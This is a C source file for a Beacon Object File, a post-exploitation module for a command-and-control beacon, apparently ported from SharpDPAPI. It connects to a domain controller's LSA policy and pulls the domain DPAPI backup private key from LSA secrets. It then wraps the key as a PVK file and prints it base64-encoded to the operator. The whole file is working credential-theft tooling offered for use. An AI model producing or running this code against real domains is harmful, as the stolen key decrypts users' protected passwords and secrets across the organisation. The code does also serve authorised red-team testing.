/*
 * backupkey.c — BOF for retrieving DPAPI domain backup key
 *
 * Usage:
 *   backupkey [/server:DC_HOSTNAME] [/nowrap]
 *
 * Retrieves the domain DPAPI backup key from a domain controller
 * via LsaRetrievePrivateData. Requires domain admin privileges.
 * Outputs the key in PVK format (base64) for use with other commands.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "interop.h"
#include "lsadump.h"
#include "helpers.h"

/* PVK file header structure */
#pragma pack(push, 1)
typedef struct _PVK_HEADER {
    DWORD dwMagic;       /* 0xB0B5F11E */
    DWORD dwVersion;     /* Always 0 */
    DWORD dwKeySpec;     /* 1 = AT_KEYEXCHANGE */
    DWORD dwEncryptType; /* 0 = not encrypted */
    DWORD cbEncryptData; /* 0 */
    DWORD cbPvk;         /* Length of private key data */
} PVK_HEADER;
#pragma pack(pop)

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* server_str = BeaconDataExtract(&parser, NULL);
    int   nowrap     = BeaconDataInt(&parser);

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI BackupKey (BOF) ===\n");

    /* Determine target DC */
    wchar_t* wserver = NULL;
    char* dc_name = NULL;

    if (server_str && strlen(server_str) > 0) {
        wserver = utf8_to_wide(server_str);
    } else {
        dc_name = get_dc_name();
        if (!dc_name) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Could not determine domain controller\n");
            return;
        }
        wserver = utf8_to_wide(dc_name);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using DC: %s\n", dc_name);
    }

    if (!wserver) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resolve DC name\n");
        if (dc_name) intFree(dc_name);
        return;
    }

    /*
     * The DPAPI domain backup key secret name is:
     * G$BCKUPKEY_PREFERRED    — GUID of preferred backup key
     * G$BCKUPKEY_P            — preferred key data
     * G$BCKUPKEY_{GUID}       — actual backup key data
     *
     * We first get the preferred GUID, then retrieve that key.
     */

    /* Open LSA policy on the DC */
    LSA_HANDLE hPolicy = NULL;
    LSA_UNICODE_STRING lusSystemName;
    LSA_OBJECT_ATTRIBUTES ObjectAttributes;

    memset(&ObjectAttributes, 0, sizeof(ObjectAttributes));
    lusSystemName.Buffer = wserver;
    lusSystemName.Length = (USHORT)(wcslen(wserver) * sizeof(wchar_t));
    lusSystemName.MaximumLength = lusSystemName.Length + sizeof(wchar_t);

    NTSTATUS status;
#ifdef BOF
    status = ADVAPI32$LsaOpenPolicy(&lusSystemName, &ObjectAttributes,
                                     0x00000004, /* POLICY_GET_PRIVATE_INFORMATION */
                                     &hPolicy);
#else
    status = LsaOpenPolicy(&lusSystemName, &ObjectAttributes,
                           0x00000004, &hPolicy);
#endif

    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaOpenPolicy on %s failed: 0x%08x\n",
                     dc_name ? dc_name : server_str, status);
        intFree(wserver);
        if (dc_name) intFree(dc_name);
        return;
    }

    /* Step 1: Retrieve BCKUPKEY_PREFERRED to get the GUID */
    LSA_UNICODE_STRING lusPreferred;
    wchar_t preferred_name[] = L"G$BCKUPKEY_PREFERRED";
    lusPreferred.Buffer = preferred_name;
    lusPreferred.Length = (USHORT)(wcslen(preferred_name) * sizeof(wchar_t));
    lusPreferred.MaximumLength = lusPreferred.Length + sizeof(wchar_t);

    PLSA_UNICODE_STRING pPreferredData = NULL;

#ifdef BOF
    status = ADVAPI32$LsaRetrievePrivateData(hPolicy, &lusPreferred, &pPreferredData);
#else
    status = LsaRetrievePrivateData(hPolicy, &lusPreferred, &pPreferredData);
#endif

    if (status != 0 || !pPreferredData || pPreferredData->Length < 16) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not retrieve BCKUPKEY_PREFERRED: 0x%08x\n", status);
#ifdef BOF
        ADVAPI32$LsaClose(hPolicy);
#else
        LsaClose(hPolicy);
#endif
        intFree(wserver);
        if (dc_name) intFree(dc_name);
        return;
    }

    /* Parse the preferred GUID */
    GUID preferred_guid;
    memcpy(&preferred_guid, pPreferredData->Buffer, 16);

    char* guid_str = guid_to_string(&preferred_guid);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Preferred backup key GUID: %s\n",
                 guid_str ? guid_str : "?");

#ifdef BOF
    ADVAPI32$LsaFreeMemory(pPreferredData);
#else
    LsaFreeMemory(pPreferredData);
#endif

    /* Step 2: Retrieve the actual backup key using the GUID */
    wchar_t key_name[128];
    swprintf(key_name, L"G$BCKUPKEY_%s", guid_str ? utf8_to_wide(guid_str) : L"?");

    LSA_UNICODE_STRING lusKeyName;
    lusKeyName.Buffer = key_name;
    lusKeyName.Length = (USHORT)(wcslen(key_name) * sizeof(wchar_t));
    lusKeyName.MaximumLength = lusKeyName.Length + sizeof(wchar_t);

    PLSA_UNICODE_STRING pKeyData = NULL;

#ifdef BOF
    status = ADVAPI32$LsaRetrievePrivateData(hPolicy, &lusKeyName, &pKeyData);
#else
    status = LsaRetrievePrivateData(hPolicy, &lusKeyName, &pKeyData);
#endif

    if (status != 0 || !pKeyData || pKeyData->Length == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not retrieve backup key data: 0x%08x\n", status);
#ifdef BOF
        ADVAPI32$LsaClose(hPolicy);
#else
        LsaClose(hPolicy);
#endif
        if (guid_str) intFree(guid_str);
        intFree(wserver);
        if (dc_name) intFree(dc_name);
        return;
    }

    BYTE* key_bytes = (BYTE*)pKeyData->Buffer;
    int key_len = pKeyData->Length;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Backup key data length: %d bytes\n", key_len);

    /*
     * The backup key data contains:
     * [0-3]    version (2)
     * [4-7]    flags
     * [8-11]   key length
     * [12+]    private key (RSAFULLPRIVATEBLOB or similar)
     *
     * We create a PVK file wrapping the key.
     */

    /* Extract the actual private key portion */
    if (key_len < 16) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Backup key data too short\n");
    } else {
        DWORD version = *(DWORD*)(key_bytes + 0);
        DWORD pk_len = *(DWORD*)(key_bytes + 8);

        if (version == 2 && pk_len > 0 && (int)(12 + pk_len) <= key_len) {
            BYTE* pk_data = key_bytes + 12;

            /* Build PVK file */
            int pvk_total = sizeof(PVK_HEADER) + pk_len;
            BYTE* pvk_file = (BYTE*)intAlloc(pvk_total);
            if (pvk_file) {
                PVK_HEADER* hdr = (PVK_HEADER*)pvk_file;
                hdr->dwMagic = 0xB0B5F11E;
                hdr->dwVersion = 0;
                hdr->dwKeySpec = 1; /* AT_KEYEXCHANGE */
                hdr->dwEncryptType = 0;
                hdr->cbEncryptData = 0;
                hdr->cbPvk = pk_len;
                memcpy(pvk_file + sizeof(PVK_HEADER), pk_data, pk_len);

                /* Base64 encode the PVK */
                char* b64 = base64_encode(pvk_file, pvk_total);
                if (b64) {
                    if (nowrap) {
                        BeaconPrintf(CALLBACK_OUTPUT, "\n%s\n", b64);
                    } else {
                        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] PVK (base64-encoded):\n");
                        /* Print in 64-char lines */
                        int b64_len = strlen(b64);
                        for (int i = 0; i < b64_len; i += 64) {
                            int chunk = b64_len - i;
                            if (chunk > 64) chunk = 64;
                            char line[68];
                            strncpy(line, b64 + i, chunk);
                            line[chunk] = 0;
                            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", line);
                        }
                    }
                    intFree(b64);
                }
                intFree(pvk_file);
            }
        } else {
            /* Fallback: output raw as hex */
            char* hex = bytes_to_hex(key_bytes, key_len > 256 ? 256 : key_len);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Raw backup key (hex): %s%s\n",
                         hex ? hex : "?", key_len > 256 ? "..." : "");
            if (hex) intFree(hex);
        }
    }

#ifdef BOF
    ADVAPI32$LsaFreeMemory(pKeyData);
    ADVAPI32$LsaClose(hPolicy);
#else
    LsaFreeMemory(pKeyData);
    LsaClose(hPolicy);
#endif

    if (guid_str) intFree(guid_str);
    intFree(wserver);
    if (dc_name) intFree(dc_name);
}
